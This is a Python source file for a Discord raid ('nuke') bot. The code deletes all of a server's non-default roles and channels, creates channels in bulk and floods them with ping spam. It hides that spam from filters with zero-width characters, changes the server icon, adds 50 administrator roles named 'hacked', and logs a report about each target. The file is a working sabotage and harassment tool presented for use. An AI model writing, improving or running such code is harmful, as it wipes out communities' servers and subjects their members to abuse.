import discord
import asyncio
import aiohttp
import discord
import asyncio
import aiohttp
import random
from datetime import datetime

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ V3 STEALTH ENGINE / MOTOR DE INVISIBILIDAD V3 ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class Stealth:
    @staticmethod
    def obfuscate(text):
        """Advanced invisible obfuscation using Zero Width characters."""
        chars = ["\u200b", "\u200c", "\u200d", "\u200e", "\u200f"]
        suffix = "".join(random.choices(chars, k=random.randint(2, 6)))
        return f"{text}{suffix}"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ V3 ATTACK CORE / NUCLEO DE ATAQUE V3 ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def execute_nuke(ctx, bot, name, text, channels_count, pings_count, premium, log_id, icon_url):
    guild = ctx.guild
    start_time = datetime.utcnow()
    
    # 1. Mass Destruction (Parallel Execution)
    destruction_tasks = [
        *(role.delete() for role in guild.roles if not role.is_default() and not role.managed),
        *(channel.delete() for channel in guild.channels)
    ]
    
    if premium:
        destruction_tasks.append(premium_actions(guild, icon_url))
        
    await asyncio.gather(*destruction_tasks, return_exceptions=True)
    
    # 2. Sonic Spam (Non-blocking creation)
    pings_per_channel = pings_count // channels_count if channels_count > 0 else 0
    remaining = pings_count % channels_count if channels_count > 0 else 0
    
    for i in range(channels_count):
        extra = 1 if i < remaining else 0
        asyncio.create_task(spawn_channel(guild, name, text, i, pings_per_channel + extra, premium))
        # Ultra-low jitter to prevent instant API block
        await asyncio.sleep(0.02)
    
    await send_log(ctx, bot, premium, original_members=guild.member_count, channels=channels_count, pings=pings_count, log_id=log_id)

async def spawn_channel(guild, name, text, index, amount, premium):
    try:
        channel = await guild.create_text_channel(f"{name}-{index+1}")
        asyncio.create_task(start_spam(channel, text, amount, premium))
    except: pass

async def start_spam(channel, text, amount, premium):
    for _ in range(amount):
        try:
            final_text = Stealth.obfuscate(text) if premium else text
            await channel.send(final_text)
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(e.retry_after if hasattr(e, 'retry_after') else 1.0)
            else: break
        except: break

async def premium_actions(guild, icon_url):
    tasks = [update_icon(guild, icon_url), spawn_roles(guild)]
    await asyncio.gather(*tasks, return_exceptions=True)

async def update_icon(guild, url):
    try:
        async with aiohttp.ClientSession() as session, session.get(url) as resp:
            if resp.status == 200: await guild.edit(icon=await resp.read())
    except: pass

async def spawn_roles(guild):
    tasks = [guild.create_role(name=f"hacked-{i}", permissions=discord.Permissions(administrator=True)) for i in range(50)]
    await asyncio.gather(*tasks, return_exceptions=True)

async def send_log(ctx, bot, premium, original_members, channels, pings, log_id):
    log_channel = bot.get_channel(log_id)
    if not log_channel: return
    
    raid_type = "PREMIUM V3" if premium else "STANDARD V3"
    embed = discord.Embed(title="V3 OPERATION REPORT / REPORTE V3", color=0x2b2d31, timestamp=datetime.utcnow())
    embed.add_field(name="Target / Objetivo", value=f"**{ctx.guild.name}**\n`({ctx.guild.id})`", inline=True)
    embed.add_field(name="Operator / Operador", value=f"{ctx.author.mention}", inline=True)
    embed.add_field(name="Type / Tipo", value=f"`{raid_type}`", inline=True)
    
    stats = f"```\nMembers:  {original_members}\nChannels: {channels}\nPings:    {pings}\n```"
    embed.add_field(name="Statistics / Estadisticas", value=stats, inline=False)
    
    if ctx.guild.icon: embed.set_thumbnail(url=ctx.guild.icon.url)
    embed.set_footer(text="V3 System Execution Finished")
    
    try: await log_channel.send(embed=embed)
    except: pass
